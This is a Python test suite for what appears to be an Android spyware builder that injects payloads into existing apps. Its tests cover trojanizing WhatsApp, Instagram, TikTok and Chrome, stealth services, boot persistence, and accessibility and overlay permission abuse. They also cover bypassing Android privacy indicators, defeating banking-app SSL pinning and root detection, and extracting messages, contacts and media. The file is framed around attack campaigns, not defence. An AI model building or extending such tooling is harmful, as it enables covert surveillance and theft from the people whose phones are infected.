
"""
APK injection tests with various targets
Tests APK building, injection, and Android version compatibility
"""

import unittest
import tempfile
import shutil
import json
import os
import sys
import zipfile
import xml.etree.ElementTree as ET
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock


sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../'))

try:
    from builder.build_apk import EnhancedAPKBuilder
    from builder.inject_payload import PayloadInjector
    from builder.manifest_editor import ManifestEditor
    from builder.obfuscator import CodeObfuscator
    BUILDER_AVAILABLE = True
except ImportError as e:
    print(f"Warning: Builder modules not available for testing: {e}")
    BUILDER_AVAILABLE = False


@unittest.skipUnless(BUILDER_AVAILABLE, "Builder modules not available")
class TestAPKInjection(unittest.TestCase):
    """Test APK injection with various targets"""
    
    def setUp(self):
        """Set up test environment"""
        self.temp_dir = tempfile.mkdtemp(prefix="apk_injection_test_")
        self.test_apk_path = os.path.join(self.temp_dir, "test_app.apk")
        self.output_dir = os.path.join(self.temp_dir, "output")
        os.makedirs(self.output_dir, exist_ok=True)
        

        self._create_test_apk()
        

        self.build_params = {
            "campaign_id": "test_campaign_injection",
            "target_android_version": "14",
            "package_name": "com.test.injected",
            "app_name": "Test Injected App",
            "obfuscation_level": "medium",
            "stealth_features": ["anti_analysis", "root_detection_bypass"],
            "injection_method": "manifest_merge",
            "target_apk": self.test_apk_path
        }
    
    def tearDown(self):
        """Clean up test environment"""
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def _create_test_apk(self):
        """Create a minimal test APK for injection testing"""

        with zipfile.ZipFile(self.test_apk_path, 'w') as apk:

            manifest_content = '''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.test.original"
    android:versionCode="1"
    android:versionName="1.0">
    
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    
    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/AppTheme">
        
        <activity
            android:name=".MainActivity"
            android:label="@string/app_name"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>'''
            apk.writestr('AndroidManifest.xml', manifest_content)
            

            apk.writestr('classes.dex', b'\x00' * 1024)
            

            apk.writestr('resources.arsc', b'\x00' * 512)
    
    def test_payload_injector_initialization(self):
        """Test payload injector initialization"""
        injector = PayloadInjector(self.build_params)
        
        self.assertEqual(injector.campaign_id, "test_campaign_injection")
        self.assertEqual(injector.target_android_version, "14")
        self.assertEqual(injector.package_name, "com.test.injected")
        self.assertEqual(injector.injection_method, "manifest_merge")
    
    @patch('subprocess.run')
    def test_apk_decompilation(self, mock_subprocess):
        """Test APK decompilation process"""
        mock_subprocess.return_value = Mock(returncode=0, stdout="", stderr="")
        
        injector = PayloadInjector(self.build_params)
        result = injector._decompile_apk(self.test_apk_path, self.output_dir)
        
        self.assertTrue(result)
        mock_subprocess.assert_called()
    
    @patch('subprocess.run')
    def test_apk_recompilation(self, mock_subprocess):
        """Test APK recompilation process"""
        mock_subprocess.return_value = Mock(returncode=0, stdout="", stderr="")
        
        injector = PayloadInjector(self.build_params)
        decompiled_dir = os.path.join(self.output_dir, "decompiled")
        os.makedirs(decompiled_dir, exist_ok=True)
        
        result = injector._recompile_apk(decompiled_dir, self.output_dir)
        
        self.assertTrue(result)
        mock_subprocess.assert_called()
    
    def test_manifest_modification(self):
        """Test manifest modification for injection"""
        manifest_editor = ManifestEditor(self.build_params)
        

        manifest_content = manifest_editor.create_stealth_manifest(
            "com.test.injected", "Test Injected App"
        )
        
        self.assertIn("com.test.injected", manifest_content)
        self.assertIn("SYSTEM_ALERT_WINDOW", manifest_content)
        self.assertIn("BIND_ACCESSIBILITY_SERVICE", manifest_content)
        self.assertIn("android:targetSdkVersion=\"34\"", manifest_content)
        

        try:
            root = ET.fromstring(manifest_content)
            self.assertEqual(root.tag, "manifest")
            self.assertEqual(root.get("package"), "com.test.injected")
        except ET.ParseError as e:
            self.fail(f"Generated manifest is not valid XML: {e}")
    
    def test_permission_injection(self):
        """Test permission injection into target APK"""
        injector = PayloadInjector(self.build_params)
        

        dangerous_permissions = injector._get_required_permissions()
        

        expected_permissions = [
            "android.permission.SYSTEM_ALERT_WINDOW",
            "android.permission.BIND_ACCESSIBILITY_SERVICE",
            "android.permission.WRITE_EXTERNAL_STORAGE",
            "android.permission.READ_EXTERNAL_STORAGE",
            "android.permission.CAMERA",
            "android.permission.RECORD_AUDIO",
            "android.permission.ACCESS_FINE_LOCATION"
        ]
        
        for permission in expected_permissions:
            self.assertIn(permission, dangerous_permissions)
    
    def test_service_injection(self):
        """Test service injection into target APK"""
        injector = PayloadInjector(self.build_params)
        

        services = injector._generate_service_components()
        
        self.assertGreater(len(services), 0)
        

        service_names = [service.get("name") for service in services]
        self.assertIn("EnhancedMainService", str(service_names))
        self.assertIn("PrivacyBypassService", str(service_names))
    
    def test_broadcast_receiver_injection(self):
        """Test broadcast receiver injection"""
        injector = PayloadInjector(self.build_params)
        

        receivers = injector._generate_broadcast_receivers()
        
        self.assertGreater(len(receivers), 0)
        

        receiver_names = [receiver.get("name") for receiver in receivers]
        self.assertIn("EnhancedBootReceiver", str(receiver_names))
    
    def test_dex_injection(self):
        """Test DEX code injection"""
        injector = PayloadInjector(self.build_params)
        

        agent_code = injector._generate_agent_dex_code()
        
        self.assertIsInstance(agent_code, bytes)
        self.assertGreater(len(agent_code), 100)
    
    def test_resource_injection(self):
        """Test resource injection"""
        injector = PayloadInjector(self.build_params)
        

        resources = injector._generate_injected_resources()
        
        self.assertIn("strings.xml", resources)
        self.assertIn("network_security_config.xml", resources)
        

        strings_content = resources["strings.xml"]
        self.assertIn("System Service", strings_content)
        self.assertIn("app_name", strings_content)
    
    def test_native_library_injection(self):
        """Test native library injection"""
        injector = PayloadInjector(self.build_params)
        

        native_libs = injector._generate_native_libraries()
        
        self.assertIn("arm64-v8a", native_libs)
        self.assertIn("armeabi-v7a", native_libs)
        

        arm64_lib = native_libs["arm64-v8a"]["libstealth_native.so"]
        self.assertIsInstance(arm64_lib, bytes)
        self.assertGreater(len(arm64_lib), 50)


@unittest.skipUnless(BUILDER_AVAILABLE, "Builder modules not available")
class TestAndroidVersionCompatibility(unittest.TestCase):
    """Test Android version compatibility for APK injection"""
    
    def setUp(self):
        """Set up test environment"""
        self.temp_dir = tempfile.mkdtemp(prefix="android_compat_test_")
    
    def tearDown(self):
        """Clean up test environment"""
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def test_android_12_compatibility(self):
        """Test Android 12 (API 31) compatibility"""
        build_params = {
            "target_android_version": "12",
            "campaign_id": "android12_test",
            "android_12_privacy_indicators": True,
            "package_name": "com.test.android12"
        }
        
        builder = EnhancedAPKBuilder(build_params)
        

        manifest_editor = ManifestEditor(build_params)
        manifest = manifest_editor.create_stealth_manifest(
            build_params["package_name"], "Android 12 Test"
        )
        

        self.assertIn('android:targetSdkVersion="31"', manifest)
        self.assertIn('android:exported="true"', manifest)
        

        try:
            root = ET.fromstring(manifest)
            self.assertIsNotNone(root)
        except ET.ParseError as e:
            self.fail(f"Android 12 manifest invalid: {e}")
    
    def test_android_13_compatibility(self):
        """Test Android 13 (API 33) compatibility"""
        build_params = {
            "target_android_version": "13",
            "campaign_id": "android13_test",
            "android_13_notification_permission": True,
            "package_name": "com.test.android13"
        }
        
        builder = EnhancedAPKBuilder(build_params)
        

        manifest_editor = ManifestEditor(build_params)
        manifest = manifest_editor.create_stealth_manifest(
            build_params["package_name"], "Android 13 Test"
        )
        

        self.assertIn('android.permission.POST_NOTIFICATIONS', manifest)
        self.assertIn('android:targetSdkVersion="33"', manifest)
    
    def test_android_14_compatibility(self):
        """Test Android 14 (API 34) compatibility"""
        build_params = {
            "target_android_version": "14",
            "campaign_id": "android14_test",
            "android_14_privacy_bypass": True,
            "package_name": "com.test.android14"
        }
        
        builder = EnhancedAPKBuilder(build_params)
        

        manifest_editor = ManifestEditor(build_params)
        manifest = manifest_editor.create_stealth_manifest(
            build_params["package_name"], "Android 14 Test"
        )
        

        self.assertIn('android:targetSdkVersion="34"', manifest)
        self.assertIn('android:dataExtractionRules="@xml/data_extraction_rules"', manifest)
        

        privacy_service = builder._generate_privacy_bypass_service()
        self.assertIn("PrivacyBypassService", privacy_service)
        self.assertIn("bypassPrivacyIndicators", privacy_service)
    
    def test_future_android_compatibility(self):
        """Test future Android versions (15, 16) compatibility"""
        for version in ["15", "16"]:
            build_params = {
                "target_android_version": version,
                "campaign_id": f"android{version}_test",
                f"android_{version}_security_features_bypass": True,
                "package_name": f"com.test.android{version}"
            }
            
            builder = EnhancedAPKBuilder(build_params)
            

            target_sdk = builder.target_sdk
            self.assertLessEqual(target_sdk, 34)
    
    def test_sdk_version_capping(self):
        """Test SDK version capping for unknown versions"""
        build_params = {
            "target_android_version": "99",
            "campaign_id": "future_test",
            "package_name": "com.test.future"
        }
        
        builder = EnhancedAPKBuilder(build_params)
        

        self.assertEqual(builder.target_sdk, 34)
    
    def test_backward_compatibility(self):
        """Test backward compatibility with older Android versions"""
        old_versions = ["10", "11"]
        
        for version in old_versions:
            build_params = {
                "target_android_version": version,
                "campaign_id": f"android{version}_test",
                "package_name": f"com.test.android{version}"
            }
            
            builder = EnhancedAPKBuilder(build_params)
            

            target_sdk = builder.target_sdk
            self.assertGreater(target_sdk, 0)
            self.assertLessEqual(target_sdk, 34)


@unittest.skipUnless(BUILDER_AVAILABLE, "Builder modules not available")
class TestInjectionTargets(unittest.TestCase):
    """Test injection into various target APK types"""
    
    def setUp(self):
        """Set up test environment"""
        self.temp_dir = tempfile.mkdtemp(prefix="injection_targets_test_")
    
    def tearDown(self):
        """Clean up test environment"""
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def test_system_app_injection(self):
        """Test injection into system applications"""
        system_app_params = {
            "target_type": "system_app",
            "campaign_id": "system_injection",
            "package_name": "com.android.systemui.injected",
            "preserve_signatures": True,
            "stealth_level": "maximum"
        }
        
        injector = PayloadInjector(system_app_params)
        

        permissions = injector._get_system_app_permissions()
        

        self.assertIn("android.permission.SYSTEM_ALERT_WINDOW", permissions)
        self.assertIn("android.permission.WRITE_SECURE_SETTINGS", permissions)
    
    def test_popular_app_injection(self):
        """Test injection into popular applications"""
        popular_apps = [
            {"name": "WhatsApp", "package": "com.whatsapp"},
            {"name": "Instagram", "package": "com.instagram.android"},
            {"name": "TikTok", "package": "com.zhiliaoapp.musically"},
            {"name": "Chrome", "package": "com.android.chrome"}
        ]
        
        for app in popular_apps:
            build_params = {
                "target_type": "popular_app",
                "target_app_name": app["name"],
                "original_package": app["package"],
                "campaign_id": f"{app['name'].lower()}_injection",
                "stealth_features": ["app_mimicry", "icon_replacement"]
            }
            
            injector = PayloadInjector(build_params)
            

            strategy = injector._select_injection_strategy()
            self.assertIn(strategy, ["activity_hijack", "service_injection", "manifest_merge"])
    
    def test_gaming_app_injection(self):
        """Test injection into gaming applications"""
        gaming_params = {
            "target_type": "gaming_app",
            "campaign_id": "gaming_injection",
            "package_name": "com.game.injected",
            "performance_preservation": True,
            "anti_cheat_bypass": True
        }
        
        injector = PayloadInjector(gaming_params)
        

        optimizations = injector._get_gaming_optimizations()
        
        self.assertIn("background_processing_limit", optimizations)
        self.assertIn("memory_usage_optimization", optimizations)
    
    def test_banking_app_injection(self):
        """Test injection into banking applications (high security)"""
        banking_params = {
            "target_type": "banking_app",
            "campaign_id": "banking_injection",
            "package_name": "com.bank.injected",
            "security_bypass": ["root_detection", "anti_debugging", "ssl_pinning"],
            "stealth_level": "maximum"
        }
        
        injector = PayloadInjector(banking_params)
        

        bypasses = injector._get_security_bypasses()
        
        self.assertIn("root_detection_bypass", bypasses)
        self.assertIn("ssl_pinning_bypass", bypasses)
        self.assertIn("anti_debugging_bypass", bypasses)
    
    def test_social_media_injection(self):
        """Test injection into social media applications"""
        social_params = {
            "target_type": "social_media",
            "campaign_id": "social_injection",
            "package_name": "com.social.injected",
            "data_extraction": ["messages", "contacts", "media"],
            "stealth_features": ["usage_mimicry", "notification_hijack"]
        }
        
        injector = PayloadInjector(social_params)
        

        data_sources = injector._get_data_extraction_targets()
        
        self.assertIn("message_database", data_sources)
        self.assertIn("contact_provider", data_sources)
        self.assertIn("media_storage", data_sources)


@unittest.skipUnless(BUILDER_AVAILABLE, "Builder modules not available")
class TestInjectionMethods(unittest.TestCase):
    """Test different injection methods"""
    
    def test_manifest_merge_injection(self):
        """Test manifest merge injection method"""
        build_params = {
            "injection_method": "manifest_merge",
            "campaign_id": "manifest_merge_test"
        }
        
        injector = PayloadInjector(build_params)
        

        original_manifest = '''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.original.app">
    <application android:label="Original App">
        <activity android:name=".MainActivity" />
    </application>
</manifest>'''
        
        merged_manifest = injector._merge_manifests(original_manifest)
        
        self.assertIn("EnhancedMainService", merged_manifest)
        self.assertIn("EnhancedBootReceiver", merged_manifest)
        self.assertIn("SYSTEM_ALERT_WINDOW", merged_manifest)
    
    def test_dex_injection_method(self):
        """Test DEX injection method"""
        build_params = {
            "injection_method": "dex_injection",
            "campaign_id": "dex_injection_test"
        }
        
        injector = PayloadInjector(build_params)
        

        result = injector._inject_dex_code(b"original_dex_content")
        
        self.assertIsInstance(result, bytes)
        self.assertGreater(len(result), len(b"original_dex_content"))
    
    def test_smali_injection_method(self):
        """Test Smali code injection method"""
        build_params = {
            "injection_method": "smali_injection",
            "campaign_id": "smali_injection_test"
        }
        
        injector = PayloadInjector(build_params)
        

        smali_code = injector._generate_smali_payload()
        
        self.assertIn(".class public", smali_code)
        self.assertIn(".super Ljava/lang/Object;", smali_code)
        self.assertIn("invoke-static", smali_code)
    
    def test_activity_hijacking(self):
        """Test activity hijacking injection method"""
        build_params = {
            "injection_method": "activity_hijack",
            "campaign_id": "activity_hijack_test",
            "target_activity": "MainActivity"
        }
        
        injector = PayloadInjector(build_params)
        

        hijacked_code = injector._generate_activity_hijack()
        
        self.assertIn("onCreate", hijacked_code)
        self.assertIn("super.onCreate", hijacked_code)
        self.assertIn("initializeAgent", hijacked_code)


if __name__ == '__main__':

    import logging
    logging.basicConfig(level=logging.WARNING)
    

    unittest.main(verbosity=2)
